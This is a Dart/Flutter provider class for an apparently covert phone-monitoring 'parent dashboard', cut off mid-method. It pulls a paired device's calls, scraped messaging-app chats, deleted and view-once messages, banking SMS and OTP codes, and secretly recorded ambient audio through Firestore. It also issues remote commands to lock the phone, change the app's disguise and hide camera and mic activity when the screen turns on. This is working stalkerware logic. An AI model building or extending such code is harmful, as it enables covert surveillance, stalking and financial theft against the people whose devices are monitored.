import 'dart:async';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter/foundation.dart';
import '../models/device_status.dart';
import '../models/child_profile.dart';
import '../models/call_record.dart';
import '../models/chat_message.dart';
import '../models/notification_item.dart';
import '../models/watchlist_target.dart';
import '../models/ambient_log_item.dart';
import '../services/audio_playback_service.dart';

class ParentDashboardProvider extends ChangeNotifier {
  ParentDashboardProvider() {
    _initFirebaseListeners();
  }

  FirebaseFirestore? _firestore;
  StreamSubscription? _deviceSub;
  StreamSubscription? _callsSub;
  StreamSubscription? _chatsSub;
  StreamSubscription? _notifsSub;

  final List<ChildProfile> _children = [];
  List<ChildProfile> get children => _children;

  String _activeChildId = "";
  String get activeChildId => _activeChildId;

  String get activePairingCode => _children.isEmpty ? '' : activeChild.pairingCode;

  ChildProfile get activeChild =>
      _children.firstWhere((c) => c.id == _activeChildId,
          orElse: () => _children.isNotEmpty
              ? _children.first
              : ChildProfile(
                  id: _activeChildId.isNotEmpty ? _activeChildId : 'none',
                  pairingCode: _activeChildId,
                  name: 'No Device',
                  deviceModel: 'Unknown',
                  batteryLevel: 0,
                  isOnline: false,
                  locationAddress: 'Link a child device to begin',
                  selectedDisguise: 'System Toolkit',
                ));

  void switchChild(String childId) {
    _activeChildId = childId;
    _initFirebaseListeners();
    notifyListeners();
  }

  ChildProfile addNewChild({
    required String name,
    String? deviceModel,
    String? customCode,
  }) {
    final code = (customCode != null && customCode.trim().isNotEmpty)
        ? customCode.trim().toUpperCase()
        : _generateUniquePairingCode();
    final newId = "child_${DateTime.now().millisecondsSinceEpoch}";
    final newChild = ChildProfile(
      id: newId,
      pairingCode: code,
      name: name.trim(),
      deviceModel: (deviceModel != null && deviceModel.trim().isNotEmpty)
          ? deviceModel.trim()
          : "Android Phone",
      batteryLevel: 100,
      isOnline: true,
      locationAddress: "Waiting for device setup...",
      selectedDisguise: "System Toolkit",
    );
    _children.add(newChild);
    _childCallRecords[newId] = [];
    _childChatMessages[newId] = [];
    _childAmbientLogs[newId] = [];
    _childNotifications[newId] = [];
    _childWatchlists[newId] = [];
    _activeChildId = newId;
    _initFirebaseListeners();
    notifyListeners();
    return newChild;
  }

  String _generateUniquePairingCode() {
    final rand = 1000 + (DateTime.now().millisecondsSinceEpoch % 9000);
    return 'VYRA-$rand';
  }

  ChildProfile linkChildWithCode(String code, {String? name}) {
    final cleanCode = code.trim().toUpperCase();
    if (cleanCode.isEmpty) return activeChild;

    final existingIdx = _children.indexWhere((c) => c.id == cleanCode || c.pairingCode == cleanCode);
    if (existingIdx != -1) {
      _activeChildId = _children[existingIdx].id;
      _initFirebaseListeners();
      notifyListeners();
      return _children[existingIdx];
    } else {
      final newChild = ChildProfile(
        id: cleanCode,
        pairingCode: cleanCode,
        name: name ?? "Child Device ($cleanCode)",
        deviceModel: "Android Phone",
        batteryLevel: 100,
        isOnline: true,
        locationAddress: "Connected via $cleanCode",
        selectedDisguise: "System Toolkit",
      );
      _children.add(newChild);
      _childCallRecords[cleanCode] = [];
      _childChatMessages[cleanCode] = [];
      _childAmbientLogs[cleanCode] = [];
      _childNotifications[cleanCode] = [];
      _childWatchlists[cleanCode] = [];
      _activeChildId = cleanCode;
      _initFirebaseListeners();
      notifyListeners();
      return newChild;
    }
  }

  void _initFirebaseListeners() {
    try {
      _firestore ??= FirebaseFirestore.instance;
      _deviceSub?.cancel();
      _callsSub?.cancel();
      _chatsSub?.cancel();
      _notifsSub?.cancel();

      final targetDocId = activePairingCode.isNotEmpty ? activePairingCode : _activeChildId;

      // 1. Listen to active child device telemetry
      _deviceSub = _firestore
          ?.collection('devices')
          .doc(targetDocId)
          .snapshots()
          .listen((snapshot) {
        if (snapshot.exists && snapshot.data() != null) {
          final data = snapshot.data()!;
          final idx = _children.indexWhere((c) => c.id == _activeChildId);
          if (idx != -1) {
            _children[idx] = ChildProfile(
              id: _activeChildId,
              name: data['name'] ?? _children[idx].name,
              deviceModel: data['deviceModel'] ?? _children[idx].deviceModel,
              batteryLevel: (data['batteryLevel'] as num?)?.toInt() ?? _children[idx].batteryLevel,
              isOnline: data['isOnline'] as bool? ?? _children[idx].isOnline,
              locationAddress: data['locationAddress'] ?? _children[idx].locationAddress,
              selectedDisguise: data['selectedDisguise'] ?? _children[idx].selectedDisguise,
            );
            notifyListeners();
          }
        }
      }, onError: (e) => debugPrint("Device stream info: $e"));

      // 2. Listen to call records
      _callsSub = _firestore
          ?.collection('calls')
          .doc(targetDocId)
          .collection('records')
          .orderBy('timestamp', descending: true)
          .snapshots()
          .listen((snapshot) {
        if (snapshot.docs.isNotEmpty) {
          final realRecords = <CallRecord>[];
          final realAmbient = <AmbientLogItem>[];

          for (final doc in snapshot.docs) {
            final d = doc.data();
            final dt = _parseTimestamp(d['timestamp']);
            final cType = (d['callType'] ?? '').toString().toLowerCase();

            if (cType == 'ambient') {
              final rawAudio = (d['recordingUrl'] ?? d['audioUrl'] ?? d['url'])?.toString();
              final hasValidAudio = rawAudio != null && rawAudio.trim().isNotEmpty && (rawAudio.startsWith('http') || rawAudio.startsWith('/'));
              realAmbient.add(AmbientLogItem(
                id: doc.id,
                timestamp: dt,
                durationSeconds: (d['durationSeconds'] as num?)?.toInt() ?? 30,
                audioUrl: hasValidAudio ? rawAudio : null,
                locationContext: "Pocket / Desk Stealth Capture",
                speechSnippet: d['speechSnippet'] ?? "Screen-off acoustic soundbite captured from child's device.",
                conversationSummary: d['summary'] ?? "Pocket soundbite recorded automatically while screen was locked.",
                isFlagged: d['isFlagged'] as bool? ?? false,
                isPurgedFromCloud: !hasValidAudio,
                storageFreedKb: hasValidAudio ? 0 : 2048,
                speakers: [
                  SpeakerVoiceProfile(
                    speakerId: "spk_1",
                    displayName: "${activeChild.name} & Surroundings",
                    isChild: true,
                    pitch: "Natural",
                    tone: "Conversational",
                    acousticDescription: "Direct mic input from pocket/room",
                  ),
                ],
                dialogue: [
                  DialogueTurn(
                    speakerId: "spk_1",
                    speakerName: "Ambient Capture",
                    timestamp: "00:05",
                    hindiText: "Ambient voice recording available for playback.",
                    englishText: "Acoustic audio file synced from child device.",
                    emotion: "Neutral",
                  ),
                ],
              ));
            } else {
              realRecords.add(CallRecord(
                id: doc.id,
                contactName: d['contactName'] ?? 'Unknown',
                phoneNumber: d['phoneNumber'] ?? '',
                callType: (cType == 'outgoing') ? CallType.outgoing : CallType.incoming,
                timestamp: dt,
                durationSeconds: (d['durationSeconds'] as num?)?.toInt() ?? 0,
                recordingUrl: d['recordingUrl'],
                recordingDurationSeconds: (d['durationSeconds'] as num?)?.toInt() ?? 0,
                isTamperAttemptDetected: d['isTamperAttemptDetected'] as bool? ?? false,
                isWatchlistTarget: d['isWatchlistTarget'] as bool? ?? false,
              ));
            }
          }

          _childCallRecords.putIfAbsent(_activeChildId, () => []);
          _childCallRecords[_activeChildId]!.clear();
          _childCallRecords[_activeChildId]!.addAll(realRecords);

          _childAmbientLogs.putIfAbsent(_activeChildId, () => []);
          _childAmbientLogs[_activeChildId]!.clear();
          _childAmbientLogs[_activeChildId]!.addAll(realAmbient);
          notifyListeners();
        }
      }, onError: (e) => debugPrint("Calls stream info: $e"));

      // 3. Listen to chats
      _chatsSub = _firestore
          ?.collection('chats')
          .doc(targetDocId)
          .collection('messages')
          .orderBy('timestamp', descending: true)
          .snapshots()
          .listen((snapshot) {
        if (snapshot.docs.isNotEmpty) {
          final realMsgs = <ChatMessage>[];
          for (final doc in snapshot.docs) {
            final d = doc.data();
            final rawText = (d['text'] ?? '').toString();

            // Filter out UI scraper noise (resource IDs, navigation controls, timestamps)
            if (isScraperGarbage(rawText)) continue;

            final dt = _parseTimestamp(d['timestamp']);
            final appStr = (d['app'] ?? '').toString().toLowerCase();
            final rawSender = (d['sender'] ?? 'Unknown').toString().trim();

            AppType app = AppType.whatsApp;
            if (appStr.contains('insta')) app = AppType.instagram;
            if (appStr.contains('tele')) app = AppType.telegram;
            if (appStr.contains('snap')) app = AppType.snapchat;
            if (appStr.contains('sms') || appStr.contains('mms') || appStr.contains('messaging')) app = AppType.sms;

            // Automatically detect SMS / Banking / OTP alerts even if scraped under WhatsApp or generic Social
            final isSmsSenderPattern = RegExp(r'^[A-Z]{2}-[A-Z0-9]{4,10}$', caseSensitive: false).hasMatch(rawSender);
            final isBankingOtp = RegExp(
              r'\b(?:otp|authentication code|verification code|debited by|credited with|bank|acct|a/c|one time password)\b',
              caseSensitive: false,
            ).hasMatch(rawText);

            if (doc.id.startsWith('sms_') || isSmsSenderPattern || (isBankingOtp && (appStr.isEmpty || appStr == 'social' || appStr == 'whatsapp' || appStr == 'messages'))) {
              app = AppType.sms;
            }

            final parsed = parseMessageContent(
              rawSender,
              rawText,
              d['isDeletedBySender'] as bool? ?? false,
            );

            String finalSender = parsed.sender;
            String finalText = parsed.cleanText;
            bool finalDeleted = parsed.isDeleted;

            // Resolve friendly bank name for SMS
            if (app == AppType.sms) {
              if (isSmsSenderPattern) {
                final match = RegExp(r'^[A-Z]{2}-([A-Z0-9]+)$', caseSensitive: false).firstMatch(rawSender);
                final code = match?.group(1)?.toUpperCase() ?? rawSender;
                if (code.contains('UNIONB')) {
                  finalSender = 'Union Bank Of India ($rawSender)';
                } else if (code.contains('HDFC')) {
                  finalSender = 'HDFC Bank ($rawSender)';
                } else if (code.contains('SBI')) {
                  finalSender = 'State Bank of India ($rawSender)';
                } else if (code.contains('ICICI')) {
                  finalSender = 'ICICI Bank ($rawSender)';
                } else if (code.contains('AXIS')) {
                  finalSender = 'Axis Bank ($rawSender)';
                } else if (code.contains('KOTAK')) {
                  finalSender = 'Kotak Bank ($rawSender)';
                } else if (code.contains('PAYTM')) {
                  finalSender = 'Paytm Bank ($rawSender)';
                } else {
                  finalSender = '$code ($rawSender)';
                }
              } else if (finalSender == 'WhatsApp Contact' || finalSender == 'Unknown' || finalSender.isEmpty) {
                final lowerBody = rawText.toLowerCase();
                if (lowerBody.contains('union bank')) {
                  finalSender = 'Union Bank Of India';
                } else if (lowerBody.contains('hdfc')) {
                  finalSender = 'HDFC Bank';
                } else if (lowerBody.contains('sbi') || lowerBody.contains('state bank')) {
                  finalSender = 'State Bank of India';
                } else if (lowerBody.contains('icici')) {
                  finalSender = 'ICICI Bank';
                } else if (lowerBody.contains('axis')) {
                  finalSender = 'Axis Bank';
                } else {
                  finalSender = 'Bank & Security Alerts';
                }
              }
            }

            // If sender is still generic like "WhatsApp Contact" or "Snapchat Chat",
            // resolve from recent notifications around that timestamp
            if (finalSender == 'WhatsApp Contact' || finalSender == 'Snapchat Chat' || finalSender == 'Unknown' || finalSender == 'Instagram Contact') {
              final resolved = _resolveSenderFromNotifications(app, dt);
              if (resolved != null && resolved.isNotEmpty) {
                finalSender = resolved;
              }
            }

            final isIncoming = (d['isIncoming'] as bool?) ??
                (d['direction'] != 'OUTGOING' && d['isUser'] != true);

            final lowerClean = finalText.toLowerCase();
            final isViewOnce = (d['isViewOnce'] as bool?) == true ||
                lowerClean.contains('1-view') ||
                lowerClean.contains('view once') ||
                lowerClean.contains('1 view');

            final mediaUrl = (d['mediaUrl'] ?? d['recordingUrl'] ?? d['fileUrl'])?.toString();
            final mediaType = (d['mediaType'] ?? d['type'])?.toString();

            realMsgs.add(ChatMessage(
              id: doc.id,
              appType: app,
              contactName: finalSender,
              contactIdentifier: finalSender,
              messageText: finalText,
              timestamp: dt,
              isIncoming: isIncoming,
              isDeletedBackup: finalDeleted,
              isWatchlistTarget: d['isWatchlistTarget'] as bool? ?? false,
              voiceNoteUrl: (mediaType == 'voice') ? mediaUrl : (d['voiceNoteUrl']?.toString()),
              voiceNoteDurationSeconds: (d['durationSeconds'] as num?)?.toInt(),
              mediaUrl: mediaUrl,
              mediaType: mediaType,
              isViewOnce: isViewOnce,
            ));
          }

          _childChatMessages.putIfAbsent(_activeChildId, () => []);
          _childChatMessages[_activeChildId]!.clear();
          _childChatMessages[_activeChildId]!.addAll(realMsgs);
          _mergeNotificationsIntoActiveChats();
          notifyListeners();
        }
      }, onError: (e) => debugPrint("Chats stream info: $e"));

      // 4. Listen to real-time notification stream (provides exact contact names and deleted backups)
      _notifsSub = _firestore
          ?.collection('notifications')
          .doc(targetDocId)
          .collection('items')
          .orderBy('timestamp', descending: true)
          .snapshots()
          .listen((snapshot) {
        if (snapshot.docs.isNotEmpty) {
          final realNotifs = snapshot.docs.map((doc) {
            final d = doc.data();
            final dt = _parseTimestamp(d['timestamp']);
            return NotificationItem(
              id: doc.id,
              packageName: d['packageName'] ?? '',
              appName: d['appName'] ?? 'App',
              title: d['title'] ?? 'Unknown',
              message: (d['text'] ?? d['message'] ?? '').toString(),
              timestamp: dt,
              isDeletedBackup: d['isDeletedBackup'] as bool? ?? false,
              isSensitiveAlert: d['isImportant'] as bool? ?? false,
            );
          }).toList();

          _childNotifications.putIfAbsent(_activeChildId, () => []);
          _childNotifications[_activeChildId]!.clear();
          _childNotifications[_activeChildId]!.addAll(realNotifs);
          _mergeNotificationsIntoActiveChats();
          notifyListeners();
        }
      }, onError: (e) => debugPrint("Notifications stream info: $e"));
    } catch (e) {
      debugPrint("Firestore listener offline/fallback: $e");
    }
  }

  static bool isScraperGarbage(String text) {
    final t = text.trim();
    if (t.length < 2) return true;

    // View / Resource IDs (e.g. 2131232237)
    if (RegExp(r'^\d{6,}$').hasMatch(t)) return true;

    final lower = t.toLowerCase();

    // End-to-end encryption notices and security disclaimers
    if (lower.contains('end-to-end encrypted') ||
        lower.contains('end to end encrypted') ||
        lower.contains('messages and calls are end-to-end') ||
        lower.contains('your personal messages are end-to-end')) {
      return true;
    }

    // Android Action Buttons, quick actions, dialog buttons
    const actionButtons = {
      'copy',
      'copy code',
      'copy otp',
      'tap to copy',
      'reply',
      'delete',
      'delete message',
      'forward',
      'share',
      'mark as read',
      'clear all',
      'dismiss',
      'view details',
      'report',
      'block',
      'done',
      'cancel',
      'install',
      'update',
      'open',
      'messages',
      'all messages',
      'conversations',
      'select',
      'select all',
      'unread',
      'read',
    };
    if (actionButtons.contains(lower)) return true;

    // Relative timestamps: "6 minutes ago", "12 mins ago", "2 hours ago", "yesterday", "just now", "10:30 AM"
    if (RegExp(r'^\d+\s*(?:second|sec|minute|min|hour|hr|day|week|month)s?\s*(?:ago)?$', caseSensitive: false).hasMatch(t)) {
      return true;
    }
    if (lower == 'just now' || lower == 'today' || lower == 'yesterday' || lower == 'yesterday at' || lower == 'now') {
      return true;
    }
    if (RegExp(r'^\d{1,2}:\d{2}\s*(?:AM|PM|am|pm)?$').hasMatch(t)) return true;
    if (RegExp(r'^\d{1,2}/\d{1,2}/\d{2,4}$').hasMatch(t)) return true;

    // Standalone SMS sender codes (e.g. "JK-UNIONB-S", "VK-HDFCBK") when scraped as separate text views
    if (RegExp(r'^[A-Z]{2}-[A-Z0-9]{4,10}$', caseSensitive: false).hasMatch(t)) {
      return true;
    }

    // Standalone OTP digits (e.g. "188 761" or 4-8 isolated digits)
    if (RegExp(r'^\d{3}\s+\d{3}$').hasMatch(t)) return true;
    if (RegExp(r'^\d{4,8}$').hasMatch(t)) return true;

    // Notification subheaders and tags
    if (lower.startsWith('otp •') || lower.startsWith('otp:') || lower == 'otp' || lower.contains('transaction alert')) {
      return true;
    }

    const garbageIds = {
      'feed_plus_badge_icon',
      'avatar_container',
      'action_bar_root',
      'icon_placeholder',
      'status_bar_latest_event_content',
      'action_bar',
      'navigation_bar_item_labels_group',
      'action_mode_close_button',
    };
    if (garbageIds.contains(lower)) return true;

    // Static UI action bar buttons and navigation placeholders that get scraped
    const uiNavigationGarbage = {
      'ask meta ai or search',
      'search',
      'search...',
      'phone',
      'video call',
      'voice call',
      'camera',
      'more options',
      'back',
      'type a message',
      'message',
      'message...',
      'send',
      'stickers',
      'emoji',
      'attach',
      'disappearing messages',
      'chat',
      'chats',
      'calls',
      'updates',
      'communities',
      'status',
      'spotlight',
      'stories',
      'tap to chat',
      'tap to view',
      'tap to load',
      'new snap',
      'unviewed story',
      'view story',
      'add friend',
      'create group',
      'online',
      'typing...',
      'tap for more info',
      'info',
    };
    if (uiNavigationGarbage.contains(lower)) return true;

    // Snapchat streaks / feed chips (e.g., "Delivered 1h 298🔥", "Opened 2m", "Sent 5h")
    if (RegExp(r'^(delivered|opened|received|sent)\s+\d+.*', caseSensitive: false).hasMatch(t)) {
      return true;
    }
    if (RegExp(r'^\d+🔥$').hasMatch(t)) return true;

    // Instagram scraper noise: engagement metrics, feed artifacts, standalone handles
    // "Like number is2993. View likes", "Comment number is22. View comments"
    if (RegExp(r'^(like|comment|reshare|save|repost)\s+number\s+is\d+', caseSensitive: false).hasMatch(t)) return true;
    if (RegExp(r'^view\s+(likes|comments|all\s+comments)', caseSensitive: false).hasMatch(t)) return true;
    // "Reposted 66 times", "Reshare number is1402"
    if (RegExp(r'^reposted\s+\d+\s+times?', caseSensitive: false).hasMatch(t)) return true;
    // "Save number is103", "Saved to collection"
    if (RegExp(r'^save(d)?\s+(number|to\s)', caseSensitive: false).hasMatch(t)) return true;
    // "Sent 40m ago", "Seen 2h ago"
    if (RegExp(r'^(sent|seen|active)\s+\d+\s*(m|h|d|w)\s*(ago)?$', caseSensitive: false).hasMatch(t)) return true;
    // Standalone Instagram handles: "@username" only (no message text)
    if (RegExp(r'^@[a-zA-Z0-9_.]+$').hasMatch(t) && t.length < 30) return true;
    // Instagram navigation UI: "Liked by X and Y others", "Explore", "Reel", etc.
    const instaUiGarbage = {
      'liked by',
      'explore',
      'reels',
      'reel',
      'share',
      'comment',
      'like',
      'save',
      'follow',
      'following',
      'followers',
      'suggested for you',
      'sponsored',
      'see translation',
      'view all comments',
      'add a comment...',
      'more',
      'less',
    };
    if (instaUiGarbage.contains(lower)) return true;
    // "Liked by username and 234 others"
    if (RegExp(r'^liked by .+ and \d+ others?$', caseSensitive: false).hasMatch(t)) return true;

    return false;
  }

  static ParsedChatMessage parseMessageContent(
    String rawSender,
    String rawText,
    bool rawDeleted,
  ) {
    String text = rawText.trim();
    String sender = rawSender.trim();
    bool isDeleted = rawDeleted;

    // Detect WhatsApp/Telegram Deleted for Everyone
    final lowerText = text.toLowerCase();
    if (lowerText.contains('this message was deleted') ||
        lowerText.contains('you deleted this message') ||
        lowerText.contains('message deleted by sender')) {
      isDeleted = true;
      text = '🚫 This message was deleted by sender (Captured before deletion)';
    }

    // 1. WhatsApp group message prefix: "~ sonia arora: message text"
    final tildeMatch = RegExp(r'^~\s*([^:]+):\s*(.*)$', dotAll: true).firstMatch(text);
    if (tildeMatch != null) {
      final extractedSender = tildeMatch.group(1)?.trim() ?? '';
      final body = tildeMatch.group(2)?.trim() ?? '';
      if (extractedSender.isNotEmpty) {
        sender = extractedSender;
        text = body.isNotEmpty ? body : text;
      }
    } else {
      // 2. Standard prefix: "Ayush: hello"
      final prefixMatch = RegExp(r'^([A-Za-z0-9\s\+\-\(\)]{2,25}):\s+(.*)$', dotAll: true).firstMatch(text);
      if (prefixMatch != null) {
        final candSender = prefixMatch.group(1)?.trim() ?? '';
        final body = prefixMatch.group(2)?.trim() ?? '';
        final lowerCand = candSender.toLowerCase();
        if (lowerCand != 'http' &&
            lowerCand != 'https' &&
            lowerCand != 'note' &&
            lowerCand != 'warning' &&
            lowerCand != 'status' &&
            body.isNotEmpty) {
          sender = candSender;
          text = body;
        }
      }
    }

    return ParsedChatMessage(
      sender: sender,
      cleanText: text,
      isDeleted: isDeleted,
    );
  }

  String? _resolveSenderFromNotifications(AppType app, DateTime dt) {
    final notifs = _childNotifications[_activeChildId] ?? [];
    if (notifs.isEmpty) return null;

    final targetAppStr = app.displayName.toLowerCase();
    for (final n in notifs) {
      if (n.appName.toLowerCase().contains(targetAppStr) || targetAppStr.contains(n.appName.toLowerCase())) {
        final diff = dt.difference(n.timestamp).inMinutes.abs();
        if (diff <= 15 && n.title.isNotEmpty && n.title != 'Unknown' && !n.title.contains('Contact')) {
          return n.title;
        }
      }
    }
    return null;
  }

  void _mergeNotificationsIntoActiveChats() {
    final notifs = _childNotifications[_activeChildId] ?? [];
    final existingMsgs = _childChatMessages[_activeChildId] ?? [];

    for (final notif in notifs) {
      final appNameLower = notif.appName.toLowerCase();
      AppType app = AppType.whatsApp;
      if (appNameLower.contains('insta')) app = AppType.instagram;
      if (appNameLower.contains('tele')) app = AppType.telegram;
      if (appNameLower.contains('snap')) app = AppType.snapchat;
      if (appNameLower.contains('sms')) app = AppType.sms;

      final isSocial = appNameLower.contains('what') ||
          appNameLower.contains('insta') ||
          appNameLower.contains('tele') ||
          appNameLower.contains('snap') ||
          appNameLower.contains('sms') ||
          notif.packageName.contains('mms');

      if (!isSocial || notif.message.trim().isEmpty) continue;

      // Check if this notification already exists in messages
      final alreadyPresent = existingMsgs.any((m) {
        final sameApp = m.appType == app;
        final sameText = m.messageText.trim() == notif.message.trim();
        final timeDiff = (m.timestamp.difference(notif.timestamp)).inSeconds.abs();
        return sameApp && (sameText || timeDiff < 5);
      });

      if (!alreadyPresent) {
        existingMsgs.add(ChatMessage(
          id: 'notif_mirror_${notif.id}',
          appType: app,
          contactName: notif.title.isNotEmpty ? notif.title : 'Unknown',
          contactIdentifier: notif.title,
          messageText: notif.message,
          timestamp: notif.timestamp,
          isIncoming: true,
          isDeletedBackup: notif.isDeletedBackup,
          isWatchlistTarget: notif.isSensitiveAlert,
        ));
      } else {
        // Hydrate sender on existing messages if previously generic
        for (int i = 0; i < existingMsgs.length; i++) {
          final m = existingMsgs[i];
          if (m.appType == app &&
              (m.contactName == 'WhatsApp Contact' || m.contactName == 'Snapchat Chat' || m.contactName == 'Unknown') &&
              m.messageText.trim() == notif.message.trim()) {
            existingMsgs[i] = ChatMessage(
              id: m.id,
              appType: m.appType,
              contactName: notif.title,
              contactIdentifier: notif.title,
              messageText: m.messageText,
              timestamp: m.timestamp,
              isIncoming: m.isIncoming,
              isDeletedBackup: m.isDeletedBackup || notif.isDeletedBackup,
              isWatchlistTarget: m.isWatchlistTarget || notif.isSensitiveAlert,
            );
          }
        }
      }
    }

    // Sort descending by timestamp
    existingMsgs.sort((a, b) => b.timestamp.compareTo(a.timestamp));
  }

  List<CallRecord> getCallRecordsForContact(String contactName, String contactIdentifier) {
    final cleanName = contactName.toLowerCase().trim();
    final simplifiedName = cleanName.replaceAll(RegExp(r'\[.*?\]'), '').trim();
    final digits = contactIdentifier.replaceAll(RegExp(r'\D'), '');

    final allCalls = callRecords;
    return allCalls.where((call) {
      final callName = call.contactName.toLowerCase().trim();
      final callDigits = call.phoneNumber.replaceAll(RegExp(r'\D'), '');

      if (digits.length >= 7 && callDigits.isNotEmpty && (digits.contains(callDigits) || callDigits.contains(digits))) {
        return true;
      }
      if (simplifiedName.length > 2 && callName.isNotEmpty) {
        if (callName.contains(simplifiedName) || simplifiedName.contains(callName)) {
          return true;
        }
      }
      return false;
    }).toList();
  }

  String get _activeTargetDocId => activePairingCode.isNotEmpty ? activePairingCode : _activeChildId;

  DateTime _parseTimestamp(dynamic raw) {
    if (raw is Timestamp) return raw.toDate();
    if (raw is num) return DateTime.fromMillisecondsSinceEpoch(raw.toInt());
    if (raw is String) return DateTime.tryParse(raw) ?? DateTime.now();
    return DateTime.now();
  }

  void sendVoiceIntercom(String announcement) {
    debugPrint("Broadcasting voice intercom to ${activeChild.name}: $announcement");
    try {
      _firestore?.collection('devices').doc(_activeTargetDocId).collection('commands').add({
        'action': 'LOUDSPEAKER_INTERCOM',
        'payload': {'announcement': announcement},
        'status': 'PENDING',
        'timestamp': FieldValue.serverTimestamp(),
      });

    } catch (e) {
      debugPrint("Could not dispatch voice intercom to cloud: $e");
    }
  }

  DeviceStatus get deviceStatus {
    final c = activeChild;
    return DeviceStatus(
      deviceName: "${c.name}'s Phone",
      model: c.deviceModel,
      batteryLevel: c.batteryLevel,
      isCharging: false,
      isOnline: c.isOnline,
      lastSeen: DateTime.now(),
      locationAddress: c.locationAddress,
      latitude: 28.6139,
      longitude: 77.2090,
    );
  }

  bool _isPhoneLocked = false;
  bool get isPhoneLocked => _isPhoneLocked;

  bool _isLiveScreenActive = false;
  bool get isLiveScreenActive => _isLiveScreenActive;

  bool _isRemoteCameraActive = false;
  bool get isRemoteCameraActive => _isRemoteCameraActive;

  bool _isFlashlightOn = false;
  bool get isFlashlightOn => _isFlashlightOn;

  bool _isStealthScreenGuardEnabled = true; // Auto-cut camera/mic when child turns on screen
  bool get isStealthScreenGuardEnabled => _isStealthScreenGuardEnabled;

  void toggleStealthScreenGuard() {
    _isStealthScreenGuardEnabled = !_isStealthScreenGuardEnabled;
    try {
      _firestore?.collection('devices').doc(_activeTargetDocId).collection('commands').add({
        'action': 'SET_STEALTH_GUARD',
        'payload': {'enabled': _isStealthScreenGuardEnabled},
        'status': 'PENDING',
        'timestamp': FieldValue.serverTimestamp(),
      });
    } catch (e) {
      debugPrint("Could not dispatch stealth guard command: $e");
    }
    notifyListeners();
  }

  bool _isGeofenceEnabled = false; // Default OFF so child is never locked or restricted unexpectedly
  bool get isGeofenceEnabled => _isGeofenceEnabled;

  void toggleGeofence() {
    _isGeofenceEnabled = !_isGeofenceEnabled;
    try {
      _firestore?.collection('devices').doc(_activeTargetDocId).collection('commands').add({
        'action': 'SET_GEOFENCE_ACTIVE',
        'payload': {'enabled': _isGeofenceEnabled},
        'status': 'PENDING',
        'timestamp': FieldValue.serverTimestamp(),
      });
    } catch (e) {
      debugPrint("Could not dispatch geofence command: $e");
    }
    notifyListeners();
  }

  void switchDisguise(String disguiseName) {
    final idx = _children.indexWhere((c) => c.id == _activeChildId);
    if (idx != -1) {
      _children[idx] = _children[idx].copyWith(selectedDisguise: disguiseName);
      notifyListeners();
    }
    try {
      _firestore?.collection('devices').doc(_activeTargetDocId).collection('commands').add({
        'action': 'SWITCH_DISGUISE',
        'payload': {'disguise': disguiseName},
        'status': 'PENDING',
        'timestamp': FieldValue.serverTimestamp(),
      });
      debugPrint("Dispatched SWITCH_DISGUISE ($disguiseName) to child device");
    } catch (e) {
      debugPrint("Could not dispatch disguise change: $e");
    }
  }

  String _currentCameraLens = "back"; // "back" or "front"
  String get currentCameraLens => _currentCameraLens;

  String? _currentlyPlayingAudioId;
  String? get currentlyPlayingAudioId => _currentlyPlayingAudioId;

  // Selected App tab in Chats screen
  AppType _selectedChatApp = AppType.whatsApp;
  AppType get selectedChatApp => _selectedChatApp;

  // Call Records per Child — populated from Firestore only
  final Map<String, List<CallRecord>> _childCallRecords = {};
  List<CallRecord> get callRecords => _childCallRecords[_activeChildId] ?? [];

  // Ambient Soundbites & Voice Activity Logs per Child — populated from Firestore only
  final Map<String, List<AmbientLogItem>> _childAmbientLogs = {};
  List<AmbientLogItem> get ambientLogs => _childAmbientLogs[_activeChildId] ?? [];

  bool _autoPurgeCloudStorage = true;
  bool get autoPurgeCloudStorage => _autoPurgeCloudStorage;

  void toggleAutoPurgeCloudStorage() {
    _autoPurgeCloudStorage = !_autoPurgeCloudStorage;
    notifyListeners();
  }

  void purgeCloudAudio(String logId) {
    final list = _childAmbientLogs[_activeChildId];
    if (list != null) {
      final idx = list.indexWhere((l) => l.id == logId);
      if (idx != -1) {
        list[idx] = list[idx].copyWith(
          isPurgedFromCloud: true,
        );
        notifyListeners();
      }
    }
  }

  double get totalCloudPurgedMb {
    final list = _childAmbientLogs[_activeChildId] ?? [];
    final totalKb = list
        .where((l) => l.isPurgedFromCloud)
        .fold<int>(0, (total, item) => total + item.storageFreedKb);
    return totalKb / 1024.0;
  }

  // Chat Messages Date Range Filter (Default: Last 2 Days)
  ChatDateRange _selectedChatRange = ChatDateRange.last2Days;
  ChatDateRange get selectedChatRange => _selectedChatRange;

  void setSelectedChatRange(ChatDateRange range) {
    _selectedChatRange = range;
    notifyListeners();
  }

  Future<void> fetchHistoricalChatsFromDevice(int daysBack) async {
    try {
      _firestore?.collection('devices').doc(_activeTargetDocId).collection('commands').add({
        'action': 'FETCH_HISTORICAL_CHATS',
        'payload': {'daysBack': daysBack},
        'status': 'PENDING',
        'timestamp': FieldValue.serverTimestamp(),
      });
      debugPrint("Dispatched FETCH_HISTORICAL_CHATS ($daysBack days) to child device");
    } catch (e) {
      debugPrint("Error sending historical chat fetch command: $e");
    }
  }


  // Master Archive of Chat Messages per Child — populated from Firestore only
  final Map<String, List<ChatMessage>> _childChatMessages = {};

  List<ChatMessage> get chatMessages {
    final msgs = _childChatMessages[_activeChildId] ?? [];
    final now = DateTime.now();
    switch (_selectedChatRange) {
      case ChatDateRange.last2Days:
        final cutoff = now.subtract(const Duration(days: 2));
        return msgs.where((m) => m.timestamp.isAfter(cutoff)).toList();
      case ChatDateRange.last7Days:
        final cutoff = now.subtract(const Duration(days: 7));
        return msgs.where((m) => m.timestamp.isAfter(cutoff)).toList();
      case ChatDateRange.last30Days:
        final cutoff = now.subtract(const Duration(days: 30));
        return msgs.where((m) => m.timestamp.isAfter(cutoff)).toList();
      case ChatDateRange.allTime:
        return msgs;
    }
  }

  List<ChatMessage> get allArchivedChatMessages => _childChatMessages[_activeChildId] ?? [];

  // Notification Items per Child — populated from Firestore only
  final Map<String, List<NotificationItem>> _childNotifications = {};
  List<NotificationItem> get notifications => _childNotifications[_activeChildId] ?? [];

  // Watchlist Targets per Child — populated from Firestore only
  final Map<String, List<WatchlistTarget>> _childWatchlists = {};
  List<WatchlistTarget> get watchlistTargets => _childWatchlists[_activeChildId] ?? [];

  void setSelectedChatApp(AppType app) {
    _selectedChatApp = app;
    notifyListeners();
  }

  void toggleLockPhone() {
    _isPhoneLocked = !_isPhoneLocked;
    if (_isPhoneLocked) {
      try {
        _firestore?.collection('devices').doc(_activeTargetDocId).collection('commands').add({
          'action': 'LOCK_PHONE',
          'payload': {},
          'status': 'PENDING',
          'timestamp': FieldValue.serverTimestamp(),
